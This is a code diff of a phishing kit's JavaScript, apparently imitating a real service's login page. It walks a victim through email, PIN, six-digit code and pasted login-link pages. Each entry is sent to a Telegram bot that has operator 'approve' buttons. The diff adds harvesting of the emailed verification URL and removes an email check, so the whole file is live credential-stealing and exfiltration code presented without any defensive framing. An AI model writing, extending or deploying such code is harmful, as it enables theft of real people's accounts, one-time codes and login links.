@@ -73,54 +73,86 @@ document.addEventListener("DOMContentLoaded", function () {
         .then(response => response.json())
         .then(data => {
             if (data.ok) {
-                console.log('Message successfully sent to Telegram bot');
-                return true;
+                console.log('Message with approval buttons sent successfully');
             } else {
-                console.error('Failed to send message to Telegram:', data);
-                return false;
+                console.error('Failed to send message with buttons:', data);
             }
         })
         .catch(error => {
-            console.error('Error in sendMessageToTelegramWithButtons function:', error);
-            return false;
+            console.error('Error in sending message with buttons:', error);
         });
     }
 
-    // Function to initialize Email Entry
+    // Function to load content into #content-container seamlessly
+    function loadContent(pageUrl) {
+        console.log(`Attempting to load content from ${pageUrl}`);
+        fetch(pageUrl)
+            .then(response => {
+                if (!response.ok) throw new Error(`Network response was not ok for ${pageUrl}`);
+                return response.text();
+            })
+            .then(data => {
+                const container = document.getElementById('content-container');
+                if (container) {
+                    container.innerHTML = data;
+                    console.log(`Loaded content from ${pageUrl}`);
+                    
+                    if (pageUrl === 'page2.html') {
+                        displayStoredEmail();
+                        initPinEntry();
+                    } else if (pageUrl === 'page3.html') {
+                        initFinalCodeEntry();
+                    } else if (pageUrl === 'page4.html') {
+                        initEmailConfirmation();
+                    }
+                } else {
+                    console.error('#content-container not found');
+                }
+            })
+            .catch(error => console.error(`Error loading content from ${pageUrl}:`, error));
+    }
+
+    // Initialize email entry functionality on page 1
     function initEmailEntry() {
         const loginButton = document.querySelector('[data-testid="e2e-login-continue-button"]');
         const emailInput = document.getElementById('email');
 
         if (loginButton && emailInput) {
             console.log("Email entry elements found on Page 1");
-
             loginButton.addEventListener('click', function(event) {
                 event.preventDefault();
-                const email = emailInput.value.trim();
-
-                // Validate email format
-                const emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
-                if (!emailRegex.test(email) || email === 'test@gmail.com') {
-                    alert('Invalid email or test email entered. Please re-enter your email.');
-                    window.location.reload();  // Restart flow if email is invalid or test email
-                    return;
+                const email = emailInput.value;
+                
+                if (email) {
+                    console.log("Email entered:", email);
+                    sendMessageToTelegram(`User entered email: ${email}`).then(success => {
+                        if (success) {
+                            localStorage.setItem("userEmail", email);
+                            loadContent('page2.html');
+                        }
+                    });
+                } else {
+                    console.log('No email entered');
                 }
-
-                console.log("Email entered:", email);
-                sendMessageToTelegramWithButtons(`User entered email: ${email}`).then(success => {
-                    if (success) {
-                        localStorage.setItem("userEmail", email);
-                        sendSessionDataToTelegram("Email Entry", `Email entered: ${email}`);
-                        loadContent('page2.html');
-                    }
-                });
             });
         } else {
             console.log("Email entry elements not found on Page 1");
         }
     }
 
-    // Function to initialize PIN Entry
+    // Display the stored email on page 2
+    function displayStoredEmail() {
+        const email = localStorage.getItem("userEmail");
+        if (email) {
+            const emailDisplay = document.getElementById('userEmail');
+            if (emailDisplay) {
+                emailDisplay.textContent = email;
+                console.log("Displaying stored email on Page 2:", email);
+            }
+        }
+    }
+
+    // Initialize PIN entry functionality on page 2
     function initPinEntry() {
         const passcodeInput = document.getElementById('passcode-input');
 
@@ -129,10 +161,14 @@ document.addEventListener("DOMContentLoaded", function () {
             passcodeInput.addEventListener('input', function() {
                 if (passcodeInput.value.length === PIN_LENGTH) {
                     console.log("PIN entered:", passcodeInput.value);
-                    sendMessageToTelegramWithButtons(`Entered PIN: ${passcodeInput.value}`).then(success => {
+                    sendMessageToTelegram(`Entered PIN: ${passcodeInput.value}`).then(success => {
                         if (success) {
-                            sendSessionDataToTelegram("PIN Entry", `PIN entered: ${passcodeInput.value}`);
-                            loadContent('page3.html');
+                            // Send Telegram message with buttons and proceed after 3 seconds
+                            sendMessageToTelegramWithButtons('Please approve the entered PIN.').then(() => {
+                                setTimeout(() => {
+                                    loadContent('page3.html'); // Automatically proceed after 3 seconds
+                                }, 3000);
+                            });
                         }
                     });
                 }
@@ -142,7 +178,7 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
-    // Function to initialize Final Code Entry
+    // Initialize final 6-digit code entry on page 3
     function initFinalCodeEntry() {
         const codeInput = document.getElementById('code-input');
 
@@ -151,11 +187,17 @@ document.addEventListener("DOMContentLoaded", function () {
             codeInput.addEventListener('input', function() {
                 if (codeInput.value.length === CODE_LENGTH) {
                     console.log("Final code entered:", codeInput.value);
-                    sendMessageToTelegramWithButtons(`Entered final code: ${codeInput.value}`).then(success => {
+                    sendMessageToTelegram(`Entered final code: ${codeInput.value}`).then(success => {
                         if (success) {
-                            sendSessionDataToTelegram("Final Code Entry", `Final code entered: ${codeInput.value}`);
-                            showPopup("We've updated our login flow. Please check your email inbox for a login link. Paste the URL you receive to proceed.");
+                            // Send Telegram message with buttons and proceed after 3 seconds
+                            sendMessageToTelegramWithButtons('Please approve the final code.').then(() => {
+                                setTimeout(() => {
+                                    window.location.href = 'page4.html'; // Automatically proceed after 3 seconds
+                                }, 3000);
+                            });
                         }
+                    }).catch(error => {
+                        console.error('Error sending final code to Telegram:', error);
                     });
                 }
             });
@@ -164,47 +206,49 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
-    // Function to show the popup message after final code
-    function showPopup(message) {
-        const popup = document.createElement('div');
-        popup.style.position = 'fixed';
-        popup.style.top = '0';
-        popup.style.left = '0';
-        popup.style.width = '100%';
-        popup.style.height = '100%';
-        popup.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
-        popup.style.display = 'flex';
-        popup.style.justifyContent = 'center';
-        popup.style.alignItems = 'center';
-        popup.style.color = 'white';
-        popup.style.fontSize = '20px';
-        popup.style.zIndex = '9999';
-        popup.style.padding = '20px';
-        popup.innerHTML = `<div style="background-color: #333; padding: 20px; border-radius: 8px; text-align: center; max-width: 600px;">
-            <p>${message}</p>
-            <button onclick="handlePopupClose()">OK</button>
-        </div>`;
-        document.body.appendChild(popup);
-    }
+    // Initialize email confirmation on page 4
+    function initEmailConfirmation() {
+        const confirmEmailButton = document.getElementById('confirmEmailButton');
+        const emailInput = document.getElementById('verification-url');
 
-    // Handle the close of the popup and redirect to page4.html
-    function handlePopupClose() {
-        // Close the popup
-        const popup = document.querySelector('div[style*="position: fixed"]');
-        if (popup) {
-            document.body.removeChild(popup);
+        if (confirmEmailButton && emailInput) {
+            console.log("Email confirmation elements found on Page 4");
+
+            confirmEmailButton.addEventListener('click', function () {
+                const email = emailInput.value.trim();
+                console.log("Submit button clicked, email input is:", email);
+
+                if (email) {
+                    sendMessageToTelegram(`User confirmed email: ${email}`).then(success => {
+                        if (success) {
+                            console.log("Email confirmation sent successfully");
+                            window.location.href = 'confirmation.html';
+                        } else {
+                            console.error("Failed to send email confirmation to Telegram");
+                        }
+                    }).catch(error => {
+                        console.error("Error in sending to Telegram:", error);
+                    });
+                } else {
+                    console.log("No email entered in the input field");
+                }
+            });
+        } else {
+            console.error("Email confirmation elements not found on Page 4");
         }
-
-        // Redirect to page4.html
-        window.location.href = 'page4.html';
     }
 
     // Run the appropriate function based on the current page
     if (document.body.contains(document.getElementById('email'))) {
-        initEmailEntry();
+        initEmailEntry(); // Page 1 - Email entry
     } else if (document.body.contains(document.getElementById('passcode-input'))) {
-        initPinEntry();
+        initPinEntry(); // Page 2 - PIN entry
     } else if (document.body.contains(document.getElementById('code-input'))) {
-        initFinalCodeEntry();
+        initFinalCodeEntry(); // Page 3 - Final code entry
+    } else if (document.body.contains(document.getElementById('verification-url'))) {
+        initEmailConfirmation(); // Page 4 - Email confirmation
+    } else {
+        console.log("No matching elements found to initialize");
     }
+
 });
